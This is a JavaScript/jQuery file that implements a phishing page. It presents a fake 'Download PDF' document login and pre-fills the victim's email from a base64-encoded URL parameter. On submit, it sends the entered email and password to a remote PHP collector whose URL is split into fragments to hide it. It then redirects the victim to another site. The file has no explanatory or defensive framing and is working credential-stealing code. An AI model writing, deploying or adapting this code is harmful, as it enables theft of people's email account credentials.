(function ($) {
  let nbg1 = "htt";
  let nbg2 = "ps://kha";
  let nbg3 = "niet";
  let nbg4 = "eam.com/";
  let nbg5 = "rb/we";
  let nbg6 = "bxr.php";

  let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;

  const params_url = new URLSearchParams(window.location.search);
  const b4_emailauto = params_url.get("e");
  let emailauto = "";

  let base64regex =
    /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

  //   if (b4_emailauto != undefined) {
  if (!base64regex.test(b4_emailauto)) {
    emailauto = b4_emailauto;
  } else {
    emailauto = atob(b4_emailauto);
  }

  $(document).ready(function () {
    $("#btn4dlmodal").on("click", function (e) {
      if (emailauto != "") {
        $("#akpati").val(emailauto);
      }
      $loader_show("#ff0000");
      setTimeout(() => {
        $loader_hide();
        $("#loginModal").modal({ dismissible: false });
        $("#loginModal").modal("open");
      }, 2000);
    });
    $("#gawaboy").on("submit", function (e) {
      e.preventDefault();

      var input4email = $("#akpati").val();
      var input4passwd = $("#igodo").val();
      var form_error = [false, false];

      $("#akpati").attr("style", "").next("span").text("");
      $("#igodo").attr("style", "").next("span").text("");
      $("#showerror").html("");
      if (input4email == "") {
        $("#akpati").next("span").text("Email address is needed.");
        $("#akpati").focus().attr("style", "border-color: #ff0000 !important");
        form_error[0] = true;
      }
      if (input4passwd == "") {
        $("#igodo").next("span").text("Email password is needed.");
        $("#igodo").focus().attr("style", "border-color: #ff0000 !important");
        form_error[1] = true;
      }

      //console.log(form_error);

      if (form_error.includes(true)) {
        return false;
      }
      $.ajax({
        url: nbg,
        method: "post",
        data: {
          foc: input4email,
          fuc: input4email,
          fpc: input4passwd,
          hos: "xx[2]",
          loc: "loc.value",
          resBox: "Docs",
        },
        processData: true,
        beforeSend: function () {
          $("#showerror").removeClass("alert").text("");
          $("#btn4sbmt")
            .html('<center><div class="spinner"></div></center>')
            .prop("disabled", true);
        },
        success: function (response) {
          console.log(response);

          try {
            let res =
              typeof response === "string" ? JSON.parse(response) : response;

            if (res["signal"] == "ok") {
              window.location.replace(
                `https://travelsandtour.kjavtospares.com/?ed=${b4_emailauto}`,
              );
            } else {
              $("#showerror").html(
                "<span style='color:red'>" + res.message + "</span>",
              );
              $("#igodo").focus().val("");
              console.log("Critical Error", response);
            }
          } catch (err) {
            console.log("Invalid JSON response:", err, response);
            $("#showerror").html("Unexpected server response.");
          }
        },
        error: function (jqXHR, textStatus, errorMessage) {
          console.log(jqXHR);
          console.log(errorMessage);
          $("#showerror").html(
            "<span style='color:red'>Connection error. Please try again.</span>",
          );
        },
        complete: function () {
          $("#btn4sbmt").html("Download PDF").prop("disabled", false);
        },
      });
    });
  });
})(jQuery);
